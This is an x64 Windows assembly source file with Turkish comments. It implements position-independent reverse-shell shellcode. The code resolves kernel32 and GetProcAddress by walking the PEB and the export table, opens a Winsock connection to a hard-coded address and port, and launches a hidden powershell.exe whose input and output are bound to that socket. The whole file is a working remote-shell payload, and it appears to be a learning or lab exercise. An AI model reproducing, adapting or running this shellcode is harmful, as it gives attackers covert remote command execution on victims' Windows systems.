global start
section .text

start:
    push    rbx                        
    push    rsi                       
    push    rdi                       
    push    rbp                        
    sub     rsp, 0x28                  ; 40byte shadow space
    mov     rbp, rsp                   ; stack koruma
    and     rsp, 0xFFFFFFFFFFFFFFF0    ; stack 16byte hizalama

    ; PEB -> KERNEL32.DLL BASE ADDRESS
    xor     rcx, rcx                   
    mov     rax, [gs:rcx + 0x60]       ; gs:[0x60] (PEB VA) = rax
    mov     rax, [rax + 0x18]          ; rax = PEB->Ldr VA (PEB 0x18) 
    mov     rsi, [rax + 0x20]          ; rsi = InMemoryOrderModuleList başlangıç VA (Ldr 0x20)
    lodsq                              ; rax = [rsi], rsi++ rsi anlamsız bir yere kayar

.next_mod:
    xchg    rax, rsi                   ; rax taki modül adresi rsi ye rsideki anlamsız adres raxa geçti                   
    lodsq                              ; rax = [rsi], rsi++ rsi anlamsız bir yere kayar 
    mov     rcx, [rax + 0x50]          ; rcx = Modül İsmi (Unicode)
    cmp     dword [rcx], 0x0045004B    ; KE(little endian)
    jne     .next_mod                  
    cmp     dword [rcx + 0x4], 0x004E0052 ; RN(little endian)
    jne     .next_mod                  
    mov     rbx, [rax + 0x20]          ; rbx = kernel32.dll Base VA

    ; KERNEL32 EXPORT TABLE -> GETPROCADDRESS 
    mov     eax, [rbx + 0x3C]          ; eax = PE Header RVA (kernel32.dll Base VA + 0x3C)
    add     rax, rbx                   ; rax = PE Header VA (PE Header RVA + Kernel Base VA)
    mov     eax, [rax + 0x88]          ; eax = Export Table RVA (PE Header 0x88)
    add     rax, rbx                   ; rax = Export Table VA (Export Table RVA + Kernel Base VA)
    
    mov     r8d, [rax + 0x20]          ; r8d = AddressOfNames RVA (Export Table 0x20)
    add     r8, rbx                    ; r8 = AddressOfNames VA (AddressOfNames RVA + Kernel Base VA)
    xor     rcx, rcx                   

.search_getproc:
    inc     rcx                        ; rcx++ (Bir sonraki fonksiyona geç)
    mov     edi, [r8 + rcx * 4]        ; edi = AddressOfNames VA + rcx * 4 (Her eleman 4 byte)
    add     rdi, rbx                   ; rdi = fonk va (fonk rva + kernel base va)
    mov     r9, 0x41636f7250746547     ; r9 = "GetProcA" (Little-Endian) 
    cmp     [rdi], r9                  ; fonk va == getprocA
    jnz     .search_getproc            ; eşleşmiyosa döngü devam

    mov     edi, [rax + 0x24]          ; edi = AddressOfNameOrdinals RVA (Export Table 0x24)  
    add     rdi, rbx                   ; rdi = AddresOfNameOrdinals VA (AddressOfNameOrdinals RVA + Kernel Base VA)
    movzx   ecx, word [rdi + rcx * 2]  ; ecx(ordinal no) = Export Table VA + rcx (isim index) * 2 (2-byte word) 
    mov     edi, [rax + 0x1C]          ; edi = AddressOfFunctions RVA (Export Table VA + Export Table 0x1C)
    add     rdi, rbx                   ; rdi = Functions Table VA (AddressOfFunctions RVA + Kernel Base VA)
    mov     edi, [rdi + rcx * 4]       ; edi = GetProcAddress RVA (Functions Table VA + rcx * 4 (4-byte))
    add     rdi, rbx                   ; rdi = GetProcAddress VA (GetProcAddress RVA + Kernel Base VA)

    ; GETPROCADDRESS (KERNEL32 -> LOADLIBRARYA)
    lea     rdx, [rel str_loadlibrarya] ; rdx = "LoadLibraryA" VA (RIP-Relative)
    mov     rcx, rbx                    ; rcx = kernel32.dll (Kernel Base VA)
    call    rdi                         ; GetProcAddress([kernel32.dll], "LoadLibraryA")
    mov     rsi, rax                    ; rsi = rax = LoadLibraryA VA


    ; LOADLIBRARYA("ws2")
    lea     rcx, [rel str_ws2]         ; rcx = ws2.dll
    call    rsi                        ; LoadLibraryA("ws2")
    mov     r12, rax                   ; r12 = rax = ws2 VA

    ; GETPROCADDRESS 
    lea     rdx, [rel str_wsas]        ; rdx = "WSAStartup" VA (RIP-Relative)
    mov     rcx, r12                   ; rcx = ws2 VA
    call    rdi                        ; GetProcAddress
    mov     r13, rax                   ; r13 = rax = WSAStartup

    ;  WSAStartup
    sub     rsp, 0x1A0
    mov     rdx, rsp
    mov     rcx, 0x0202
    call    r13                        ; CALL wsa
    add     rsp, 0x1A0

    ; getproc ws2, WSASocketA
    lea     rdx, [rel str_wsa_sock]
    mov     rcx, r12
    call    rdi
    mov     r13, rax    ; r13 = WSASocketA

    ; WSASocketA
    mov     ecx, 0x02
    mov     edx, 0x01
    mov     r8d, 0x06
    xor     r9, r9
    sub     rsp, 0x30
    xor     r14, r14
    mov     [rsp + 0x20], r14
    mov     dword [rsp + 0x28], r14d 
    call    r13
    add     rsp, 0x30
    mov     r15, rax            ; r15 = socket handle


    ; getproc ws2, WSAConnect
    lea     rdx, [rel str_wsa_connect]
    mov     rcx, r12
    call    rdi
    xor     r14, r14
    mov     r14, rax    ; r14 = WSAConnect

    ; WSAConnect
    xor     rax, rax
    sub     rsp, 0x10
    mov     r11, rsp
    mov     word [rsp], 0x0002
    mov     word [rsp + 2], 0x00005c116 ;port
    mov     dword [rsp + 4], 0x0101017f ;ip
    mov     qword [rsp + 8], rax

    sub     rsp, 0x40
    mov     [rsp + 0x20], rax
    mov     [rsp + 0x28], rax
    mov     [rsp + 0x30], rax

    xor     r9, r9
    mov     r8d, 0x10
    mov     rdx, r11
    mov     rcx, r15
    call    r14
    add     rsp, 0x40
    add     rsp, 0x10

    ; getproc kernel32, CreateProcessA
    lea     rdx, [rel str_CreateProcessA]
    mov     rcx, rbx
    call    rdi
    xor     r14, r14
    mov     r14, rax    ; r14 = CreateProcessA

    ;CreateProcessA

    ;pi struct
    xor     rax, rax
    sub     rsp, 0x20
    xor     r12, r12
    mov     r12, rsp

    mov     qword [rsp], rax
    mov     qword [rsp + 8], rax
    mov     dword [rsp + 16], eax
    mov     dword [rsp + 20], eax

    ;si struct
    sub     rsp, 0x70
    mov     r13, rsp

    xor     rcx, rcx
    mov     rcx, 13
    mov     r10, r13

.clear_si:
    mov     qword [r10], rax
    add     r10, 8
    loop    .clear_si

    mov     dword [r13], 0x68   ; cb = 0x68
    mov     dword [r13 + 0x3C], 0x0101 ; dwFlags soket kollarını gizle
    mov     word [r13 + 0x40], ax ; wShowWindow = hide
    mov     [r13 + 0x50], r15 ;stdin = socket
    mov     [r13 + 0x58], r15 ;stdout = socket
    mov     [r13 + 0x60], r15 ;stderr = socket
    
    ; create process

    sub     rsp, 0x50
    mov     dword [rsp + 0x20], 1 ;inherit handle =true
    mov     [rsp + 0x28], rax
    mov     [rsp + 0x30], rax
    mov     [rsp + 0x38], rax
    mov     [rsp + 0x40], r13 ;si
    mov     [rsp + 0x48], r12 ;pi
    xor     r9, r9
    xor     r8, r8
    lea     rdx, [rel str_ps_exe]
    xor     rcx, rcx 

    call    r14

    ; stack geri verme
    add     rsp, 0x50
    add     rsp, 0x70
    add     rsp, 0x20

    ; stacki eski haline getir
    mov     rsp, rbp                   
    pop     rbp                        
    pop     rdi                        
    pop     rsi                        
    pop     rbx                        
    ret

str_loadlibrarya:
    db      "LoadLibraryA", 0
str_ws2:
    db      "Ws2_32.dll", 0
str_wsas:
    db      "WSAStartup", 0
str_wsa_sock:
    db      "WSASocketA", 0
str_wsa_connect:
    db      "WSAConnect", 0
str_CreateProcessA:
    db      "CreateProcessA", 0
str_ps_exe:
    db      "powershell.exe", 0

